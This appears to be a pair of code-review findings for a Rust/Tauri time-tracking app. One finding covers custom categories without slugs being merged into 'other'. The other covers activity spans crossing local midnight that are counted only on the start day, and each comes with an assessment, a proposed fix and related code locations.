assessment: Real bug. db.rs confirms user-created categories have slug=None (only the canonical four deep/research/comms/breaks carry slugs — D42, get_categories test at db.rs:1465). category_of maps every slug=None category to OTHER_SLUG ('other'), the SAME slug used for category_id=None (no rule matched). Consequences keyed by slug: (1) build_day_view totals HashMap keys by slug, so two custom categories 'Design' and 'Music' (+ truly-uncategorized events) merge into one CategorySlice; the first-inserted name wins via or_insert, so the displayed name is wrong and seconds are summed across unrelated categories. (2) raw_runs coalesces adjacent events by slug, so adjacent 'Design' and 'Music' runs merge into one mislabeled run. (3) frontend maps --c-<slug>, so all custom categories share the neutral 'other' colour. Reachable: M4 Settings (D42/D44) lets users create custom categories; the bug bites any user with 2+ custom categories in use, or 1 custom category that then merges with uncategorized time under one name. Not a documented deliberate choice — the OTHER_SLUG fallback comment conflates 'no slug' (a distinct custom category, identity = its id) with 'no category at all'. Warning rather than critical: zero-custom-category users (the default) are unaffected, but affected users get silently merged/mislabeled totals.
fix: Give slugless categories a stable distinct identity instead of collapsing to 'other': in category_of, for a matched category with slug=None emit a synthetic per-id slug like format!("category-{id}") (carry the id into CategoryMeta or pass it through), and reserve OTHER_SLUG strictly for category_id=None (no match). The frontend then needs a colour fallback for category-<id> slugs (use the category's stored color). Add a test: two distinct slugless categories stay two CategorySlices / two runs.
siblings: src-tauri/src/rollup.rs:246 (build_day_slice DEEP_SLUG check is unaffected, but same category_of path)

title: Spans crossing local midnight are counted whole on the start day and absent from the next (no range clipping)
assessment: Confirmed mechanically. duration() returns end_time-start_time with no clamp; db::get_activity_logs selects WHERE start_time >= ?1 AND start_time <= ?2 (by START only); lib.rs get_day/get_week/get_timeline pass the day/week bounds and the builders never clip a span to the requested range. So a 23:50→00:10 active span (start_time before midnight) is counted entirely on the day it started and is wholly missing from the next day's read (its start_time is outside that day's window). Reachability is real but narrow: capture closes spans on every focus change, the idle gate (D39) closes long-idle spans, and D41 routes lock/screensaver through the Excluded path — so a *genuinely active* single window held across local midnight (night-owl: long video with periodic input, a terminal/editor whose AXTitleChanged doesn't fire) is the trigger. Magnitude is bounded to one span's post-midnight tail (usually minutes), and totals are off only at the night boundary — so it misleads the day total slightly rather than losing or grossly corrupting data. Not critical; not a documented decision (no D-cite covers boundary handling). Warning.
fix: Clip each span to the requested [start,end] before aggregation/run-building: effective_start = max(event.start_time, range_start), effective_end = min(event.end_time, range_end), secs = (effective_end-effective_start).max(0); use these clipped bounds in duration, totals, and run start/end. Either thread the range into build_day_view/build_day_slice/build_timeline, or widen the query to select spans overlapping the range (end_time >= start AND start_time <= end) and clip in the builder. Add a midnight-crossing regression test (23:50→00:10 split across two days).
siblings: src-tauri/src/rollup.rs:242 (build_day_slice duration — same unclipped span in the Week view)
src-tauri/src/db.rs:264 (get_activity_logs selects by start_time only — overlapping spans starting before the window are also dropped from the later day)
